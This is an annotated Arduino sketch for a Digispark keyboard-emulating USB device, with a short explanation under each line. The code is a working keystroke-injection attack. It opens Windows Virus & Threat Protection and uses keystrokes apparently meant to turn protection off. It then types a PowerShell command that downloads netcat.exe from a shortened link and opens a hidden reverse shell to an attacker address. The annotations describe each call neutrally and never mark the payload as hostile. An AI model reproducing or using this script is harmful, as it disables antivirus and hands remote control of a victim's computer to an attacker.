<em><div align="center"><code>This line includes the header file "DigiKeyboard.h," which provides the necessary definitions and functions for interacting with the DigiKeyboard.</code></em></div>

<code color="#00979C">void setup(){</code>
  
<em>```This marks the beginning of the setup() function, which is a special function in Arduino that is called once when the board is powered on or reset.```<em>

<code color="#00979C">DigiKeyboard.delay(1000);</code>

<em>```This line introduces a delay of 1000 milliseconds (1 second) in the program execution.```<em>

<code color="#00979C">DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT);</code>

<em>```This line simulates pressing the 'S' key along with the left GUI (Windows key) modifier using the sendKeyStroke() function.```<em>

<code color="#00979C">DigiKeyboard.delay(1000);</code>
  
<em>```Another delay of 1000 milliseconds is introduced.```<em>

<code color="#00979C">DigiKeyboard.print("virus & threat protection");</code>
  
<em>```The print() function is used to simulate typing the string "virus & threat protection" as keystrokes.```<em>

<code color="#00979C">DigiKeyboard.delay(500);</code>
  
<em>```A delay of 500 milliseconds (0.5 seconds) is added.```<em>

<code color="#00979C">DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>
  
<em>```The sendKeyStroke() function simulates pressing the Enter key.```<em>

<code color="#00979C">DigiKeyboard.delay(5000);</code>
  
<em>```A delay of 5000 milliseconds (5 seconds) is introduced.```<em>

<code color="#00979C">DigiKeyboard.sendKeyStroke(43);</code>
  
<em>```The sendKeyStroke() function is used to simulate tapping a key with the code 43. The specific key associated with code 43 may vary depending on the keyboard layout.```<em>

<code color="#00979C">DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>
  
<em>```Another Enter key press is simulated.```<em>

<code color="#00979C">DigiKeyboard.delay(700);</code>
  
<em>```A delay of 700 milliseconds (0.7 seconds) is added.```<em>

<code color="#00979C">DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>
  
<em>```Yet another Enter key press is simulated.```<em>

<code color="#00979C">DigiKeyboard.delay(700);</code>
  
<em>``` Another delay of 700 milliseconds is introduced.```<em>

<code color="#00979C">DigiKeyboard.sendKeyStroke(KEY_SPACE);</code>
  
<em>```The sendKeyStroke() function simulates pressing the Space key.```<em>

<code color="#00979C">DigiKeyboard.delay(2000);</code>
  
<em>```A delay of 2000 milliseconds (2 seconds) is added.```<em>

<code color="#00979C">DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);</code>
  
<em>```The sendKeyStroke() function is used to simulate pressing the 'Y' key along with the left Alt modifier.```<em>

<code color="#00979C">DigiKeyboard.delay(1000);</code>
  
<em>```A delay of 1000 milliseconds (1 second) is introduced.```<em>

<code color="#00979C">DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);</code>
  
<em>```The sendKeyStroke() function is used to simulate pressing the F4 key along with the left Alt modifier. This combination is often used to close the active window in Windows.```<em>

<code color="#00979C">DigiKeyboard.delay(500);</code>
  
<em>```A delay of 500 milliseconds (0.5 seconds) is added.```<em>

<code color="#00979C">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);</code>
  
<em>```The sendKeyStroke() function is used to simulate pressing the 'R' key along with the left GUI (Windows key) modifier.```<em>

<code color="#00979C">DigiKeyboard.delay(700);</code>
  
<em>```A delay of 700 milliseconds (0.7 seconds) is introduced.```<em>

<code color="#00979C">DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe <ip> <port> -e powershell.exe");</code>
  
<em>```The print() function is used to simulate typing the provided string, which contains a PowerShell command.```<em>
  
<code color="#00979C">DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>
  
<em>```The sendKeyStroke() function is used to simulate pressing the Enter key.```<em>

<code color="#00979C">void loop(){}</code>
<em>```This is the loop() function, which runs repeatedly after the setup() function. However, in this code, the loop() function is empty, so it doesn't contain any specific instructions.```<em>
